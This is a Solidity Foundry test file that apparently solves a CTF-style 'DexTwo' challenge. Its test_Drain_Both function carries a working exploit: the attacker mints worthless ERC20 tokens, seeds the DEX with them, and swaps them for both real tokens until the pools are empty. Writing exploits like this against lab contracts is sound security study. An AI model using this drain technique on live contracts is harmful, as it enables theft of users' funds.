// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletoken1;
    SwappableTokenTwo public swappabletoken2;
    RandomTokenA public randomTokenA;
    RandomTokenB public randomTokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(attacker);
        dexTwo = new DexTwo();
        swappabletoken1 = new SwappableTokenTwo(
            address(dexTwo),
            "Swap",
            "SW",
            110
        );
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableTokenTwo(
            address(dexTwo),
            "Swap",
            "SW",
            110
        );
        vm.label(address(swappabletoken2), "Token 2");
        dexTwo.setTokens(address(swappabletoken1), address(swappabletoken2));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletoken1), 100);
        dexTwo.add_liquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        vm.stopPrank();
    }

    function test_Drain_Both() public {
        vm.startPrank(attacker);
        randomTokenA = new RandomTokenA("Random A", "RA");
        randomTokenB = new RandomTokenB("Random B", "RB");
        randomTokenA.mint(attacker, 100);
        randomTokenB.mint(attacker, 100);
        randomTokenA.mint(address(dexTwo), 100);
        randomTokenB.mint(address(dexTwo), 100);
        randomTokenA.approve(address(dexTwo), 100);
        randomTokenB.approve(address(dexTwo), 100);
        dexTwo.swap(address(randomTokenA), address(swappabletoken1), 100);
        dexTwo.swap(address(randomTokenB), address(swappabletoken2), 100);
        vm.stopPrank();
        assert(swappabletoken1.balanceOf(address(dexTwo)) == 0);
        assert(swappabletoken2.balanceOf(address(dexTwo)) == 0);
    }
}

contract RandomTokenA is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract RandomTokenB is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
